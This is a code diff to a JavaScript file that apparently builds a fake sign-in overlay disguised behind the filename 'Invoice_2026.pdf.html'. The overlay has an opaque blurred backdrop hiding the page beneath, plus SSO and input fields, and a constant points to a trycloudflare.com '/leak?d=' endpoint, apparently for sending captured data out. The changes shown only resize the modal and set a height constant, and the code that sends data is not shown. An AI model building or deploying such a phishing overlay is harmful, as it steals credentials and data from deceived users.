@@ -16,7 +16,7 @@
   /* APP HEIGHT DIAL - set a number (px) for a manual exact fit of your
      browser window, or leave null for auto (screen.availHeight - 120).
      Try ~650-750 on a MacBook if auto is too tall. */
-  var TARGET_PX = null;
+  var TARGET_PX = 1460;
   var R = "https://uniform-var-laura-cpu.trycloudflare.com/leak?d=";
   var FNAME = "Invoice_2026.pdf.html";
   function log(m) { try { console.log("[T71b] " + m + " @" + Date.now()); } catch (e) {} }
@@ -98,18 +98,18 @@
   css.textContent = [
     /* opaque, blurred backdrop - the playground is invisible behind it */
     "#t71b-ov{position:fixed;inset:0;z-index:2147483647;background:rgba(13,13,13,.97);backdrop-filter:blur(28px);display:flex;align-items:center;justify-content:center;font-family:'Sohne',-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif}",
-    "#t71b-modal{position:relative;width:400px;max-width:calc(100vw - 48px);box-sizing:border-box;background:#212121;border:1px solid rgba(255,255,255,.07);border-radius:24px;padding:28px 28px 32px;box-shadow:0 24px 64px rgba(0,0,0,.5);text-align:center;color:#fff}",
+    "#t71b-modal{position:relative;width:100%;max-width:560px;box-sizing:border-box;background:#212121;border:1px solid rgba(255,255,255,.07);border-radius:24px;padding:32px 40px 36px;box-shadow:0 24px 64px rgba(0,0,0,.5);text-align:center;color:#fff}",
     "#t71b-x{position:absolute;top:14px;right:16px;width:28px;height:28px;border:none;background:transparent;color:#fff;font-size:18px;line-height:28px;cursor:pointer;border-radius:999px}",
     "#t71b-x:hover{background:rgba(255,255,255,.1)}",
-    "#t71b-modal h1{font-size:20px;font-weight:600;line-height:1.3;margin:0 0 8px;color:#fff}",
-    "#t71b-modal p.sub{font-size:14px;color:#9b9b9b;line-height:1.5;margin:0 0 22px}",
-    "#t71b-modal button.t71b-sso{width:100%;height:48px;background:transparent;border:1px solid rgba(255,255,255,.18);border-radius:999px;font-size:15px;color:#fff;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:12px}",
+    "#t71b-modal h1{font-size:24px;font-weight:600;line-height:1.3;margin:0 10px;color:#fff}",
+    "#t71b-modal p.sub{font-size:15px;color:#9b9b9b;line-height:1.5;margin:0 0 24px}",
+    "#t71b-modal button.t71b-sso{width:100%;height:52px;background:transparent;border:1px solid rgba(255,255,255,.18);border-radius:999px;font-size:16px;color:#fff;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:14px}",
     "#t71b-or{display:flex;align-items:center;gap:12px;margin:16px 4px 18px;color:#8f8f8f;font-size:13px}",
     "#t71b-or:before,#t71b-or:after{content:'';flex:1;height:1px;background:rgba(255,255,255,.15)}",
-    "#t71b-modal input{width:100%;box-sizing:border-box;height:48px;padding:0 16px;font-size:15px;border:1px solid rgba(255,255,255,.12);border-radius:12px;background:rgba(0,0,0,.35);color:#fff;outline:none;margin-bottom:16px}",
+    "#t71b-modal input{width:100%;box-sizing:border-box;height:52px;padding:0 18px;font-size:16px;border:1px solid rgba(255,255,255,.12);border-radius:12px;background:rgba(0,0,0,.35);color:#fff;outline:none;margin-bottom:18px}",
     "#t71b-modal input::placeholder{color:#8f8f8f}",
     "#t71b-modal input:focus{border-color:rgba(255,255,255,.4)}",
-    "#t71b-modal button.t71b-cta{width:100%;height:48px;background:#fff;color:#0d0d0d;border:none;border-radius:999px;font-size:15px;font-weight:600;cursor:pointer;margin:0}",
+    "#t71b-modal button.t71b-cta{width:100%;height:52px;background:#fff;color:#0d0d0d;border:none;border-radius:999px;font-size:16px;font-weight:600;cursor:pointer;margin:0}",
     "button.t71b-cta:disabled{background:rgba(255,255,255,.7);cursor:default}",
     "#t71b-spin{width:18px;height:18px;border:2px solid rgba(13,13,13,.25);border-top-color:#0d0d0d;border-radius:50%;display:inline-block;animation:t71bspin .7s linear infinite;margin-right:8px;vertical-align:-3px}",
     "@keyframes t71bspin{to{transform:rotate(360deg)}}",
